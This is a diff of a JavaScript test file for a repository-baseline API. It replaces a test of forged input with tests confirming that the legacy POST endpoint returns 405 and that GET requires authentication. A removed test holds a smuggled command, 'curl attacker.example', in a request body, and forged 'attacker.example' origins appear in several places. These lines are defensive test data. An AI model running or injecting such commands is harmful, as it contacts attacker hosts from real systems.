@@ -152,29 +152,25 @@ test('suspended installation and removed repository access fail closed without a
   assert.equal((await ctx.database.select().from(repositoryBaseline)).length, 0);
 });
 
-test('protected endpoint ignores forged revision and commands and exposes no credential', async (t) => {
+test('legacy baseline POST is unavailable and cannot acquire source or execute a sandbox', async (t) => {
   const ctx = await createTestContext(); t.after(() => ctx.client.close());
   const auth = await context(ctx); await seed(ctx, auth);
-  const gateway = new Gateway();
   const handlers = createRepositoryBaselineHandlers({
-    configuration: CONFIG, database: ctx.database, gateway, resolveContext: async () => auth,
-    execute: (database, context, source, configuration) => executeSelectedRepositoryBaseline(database, context, source, configuration, {
-      clock: () => NOW, randomId: () => 'baseline-handler', runner: async (input) => passedEvidence(input),
-    }),
+    database: ctx.database, resolveContext: async () => auth,
   });
   const response = await handlers.run(new Request('http://localhost:3000/api/github/repositories/baseline', {
-    method: 'POST', headers: { origin: CONFIG.baseUrl, 'content-type': 'application/json' },
-    body: JSON.stringify({ commit: 'f'.repeat(40), command: 'curl attacker.example' }),
+    method: 'POST', headers: { origin: CONFIG.baseUrl, cookie: 'vigilo.session_token=authenticated-sentinel' },
   }));
-  assert.equal(response.status, 303);
-  assert.equal(gateway.calls.includes(`archive:${COMMIT}`), true);
-  assert.doesNotMatch(await response.text(), /installation-token-sentinel|curl|archive-bytes/);
+  assert.equal(response.status, 405);
+  assert.equal(response.headers.get('allow'), 'GET');
+  assert.deepEqual(await response.json(), { error: 'legacy_baseline_execution_unavailable' });
+  assert.equal((await ctx.database.select().from(repositoryBaseline)).length, 0);
 });
 
-test('baseline handlers require same-origin and authenticated workspace', async (t) => {
+test('baseline GET requires an authenticated workspace while legacy POST stays unavailable', async (t) => {
   const ctx = await createTestContext(); t.after(() => ctx.client.close());
-  const handlers = createRepositoryBaselineHandlers({ configuration: CONFIG, database: ctx.database, gateway: new Gateway(), resolveContext: async () => { throw new AccessDeniedError('unauthorized'); } });
-  assert.equal((await handlers.run(new Request('http://localhost/api', { method: 'POST', headers: { origin: 'https://attacker.example' } }))).status, 403);
+  const handlers = createRepositoryBaselineHandlers({ database: ctx.database, resolveContext: async () => { throw new AccessDeniedError('unauthorized'); } });
+  assert.equal((await handlers.run(new Request('http://localhost/api', { method: 'POST', headers: { origin: 'https://attacker.example' } }))).status, 405);
   assert.equal((await handlers.current(new Request('http://localhost/api'))).status, 401);
 });
 
